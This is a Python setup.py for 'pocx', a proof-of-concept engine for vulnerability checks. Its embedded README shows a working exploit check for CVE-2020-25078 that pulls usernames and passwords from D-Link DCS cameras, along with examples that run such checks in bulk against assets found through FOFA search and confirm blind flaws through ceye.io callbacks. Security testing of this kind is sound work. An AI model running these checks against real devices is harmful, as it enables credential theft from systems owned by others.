# -*- coding: utf-8 -*-
from setuptools import setup

packages = \
['pocx', 'pocx.funcs']

package_data = \
{'': ['*']}

install_requires = \
['httpx>=0.22.0,<0.23.0', 'loguru>=0.6.0,<0.7.0', 'urllib3>=1.26.9,<2.0.0']

setup_kwargs = {
    'name': 'pocx',
    'version': '0.2.2',
    'description': 'A Simple, Fast and Powerful poc engine tools was built by antx, which support synchronous mode and asynchronous mode.',
    'long_description': '# pocx\nA Simple, Fast and Powerful poc engine tools was built by antx, which support synchronous mode and asynchronous mode.\n\n## Description\npocx is a simple, fast and powerful poc engine tools, which support synchronous mode and asynchronous mode. pocx also \nsupport some useful features, which like fofa search and parse assets to verify. You also can use smart method to verify \nsome special assets by using ceyeio, which it is cannot return or display the result. \n\n## Install\n\n```bash\npip3 install pocx\n```\n\n## Usage\n\n### POC Template\n\n```python\n# Title: xxxxxxx\n# Author: antx\n# Email: wkaifeng2007@163.com\n# CVE: CVE-xxxx-xxxxx\n\nfrom pocx import BasicPoc, AioPoc\n\n\nclass POC(BasicPoc):\n    def __init__(self):\n        self.name = \'poc\'\n        super(POC, self).__init__()\n\n    def poc(self, target):\n        """\n        \n        your poc code here.\n        \n        """\n        return\n\n\nif __name__ == \'__main__\':\n    target = \'http://127.0.0.1\'\n    cve = POC()\n    cve.run(target)\n```\n\n### Synchronous Mode Example\n\n```python\n# Title: D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078\n# Author: antx\n# Email: wkaifeng2007@163.com\n# CVE: CVE-2020-25078\n\nfrom pocx import BasicPoc\nfrom loguru import logger\n\n\nclass DLinkPoc(BasicPoc):\n    @logger.catch(level=\'ERROR\')\n    def __init__(self):\n        self.name = \'D_Link-DCS-2530L\'\n        super(DLinkPoc, self).__init__()\n\n    @logger.catch(level=\'ERROR\')\n    def poc(self, target: str):\n        poc_url = \'/config/getuser?index=0\'\n        try:\n            resp = self.get(target + poc_url)\n            if resp.status_code == 200 and \'name=\' in resp.text and \'pass=\' in resp.text and \'priv=\' in resp.text:\n                logger.success(resp.text)\n            elif resp.status_code == 500:\n                logger.error(f\'[-] {target} {resp.status_code}\')\n        except Exception as e:\n            logger.error(f\'[-] {target} {e}\')\n\n\nif __name__ == \'__main__\':\n    target = \'http://127.0.0.1\'\n    cve = DLinkPoc()\n    cve.run(target)\n```\n\n### Asynchronous Mode Example\n\n```python\n# Title: D-Link DCS系列监控 账号密码信息泄露 CVE-2020-25078\n# Author: antx\n# Email: wkaifeng2007@163.com\n# CVE: CVE-2020-25078\n\nfrom pocx import AioPoc\nfrom loguru import logger\n\n\nclass DLinkPoc(AioPoc):\n    @logger.catch(level=\'ERROR\')\n    def __init__(self):\n        self.name = \'D_Link-DCS-2530L\'\n        super(DLinkPoc, self).__init__()\n\n    @logger.catch(level=\'ERROR\')\n    async def poc(self, target: str):\n        poc_url = \'/config/getuser?index=0\'\n        try:\n            resp = await self.aio_get(target + poc_url)\n            if resp.status_code == 200 and \'name=\' in resp.text and \'pass=\' in resp.text and \'priv=\' in resp.text:\n                logger.success(resp.text)\n            elif resp.status_code == 500:\n                logger.error(f\'[-] {target} {resp.status_code}\')\n        except Exception as e:\n            logger.error(f\'[-] {target} {e}\')\n\n\nif __name__ == \'__main__\':\n    target = \'http://127.0.0.1\'\n    cve = DLinkPoc()\n    cve.run(target)\n```\n\n### Useful Functions\n\n#### FoFa\n\n```python\n# Title: xxxxxxx\n# Author: antx\n# Email: wkaifeng2007@163.com\n# CVE: CVE-xxxx-xxxxx\n\nfrom pocx import BasicPoc, AioPoc\nfrom pocx.funcs import Fofa\n\n\nclass POC(BasicPoc):\n    def __init__(self):\n        self.name = \'poc\'\n        super(POC, self).__init__()\n\n    def poc(self, target):\n        """\n        \n        your poc code here.\n        \n        """\n        return\n\n\nif __name__ == \'__main__\':\n    grammar = \'app="xxxxxx"\'\n    cve = POC()\n    fofa = Fofa()\n    fofa.set_config(api_key=\'xxxxxx\', api_email=\'xxxxxx\')\n    print(f\'[+] the asset account of grammar: {grammar} are: {fofa.asset_counts(grammar)}\')\n    pages = fofa.asset_pages(grammar)\n    for page in range(1, pages + 1):\n        print(f\'[*] page {page}\')\n        assets = fofa.assets(grammar, page)\n        cve.run(assets)\n```\n\n#### Ceye\n\n```python\n# Title: xxxxxxx\n# Author: antx\n# Email: wkaifeng2007@163.com\n# CVE: CVE-xxxx-xxxxx\n\nfrom pocx import BasicPoc, AioPoc\nfrom pocx.funcs import Ceye\n\n\nclass POC(BasicPoc):\n    def __init__(self):\n        self.name = \'poc\'\n        super(POC, self).__init__()\n        self.ceyeio = Ceye()\n        \n    def poc(self, target):\n        pid = self.ceyeio.generate_payload_id()\n        self.ceyeio.set_config(api_token=\'xxxxxx\', identifier=\'xxxxxx.ceye.io\')\n    \n        """\n        \n        your poc code here.\n        \n        """\n        \n        self.ceyeio.verify(pid, \'dns\')\n        return\n\n\nif __name__ == \'__main__\':\n    target = \'http://127.0.0.1:8888\'\n    cve = POC()\n    cve.run(target)\n```\n',
    'author': 'antx',
    'author_email': 'wkaifeng2007@163.com',
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://github.com/antx-code/pocx',
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'python_requires': '>=3.8,<4.0',
}


setup(**setup_kwargs)
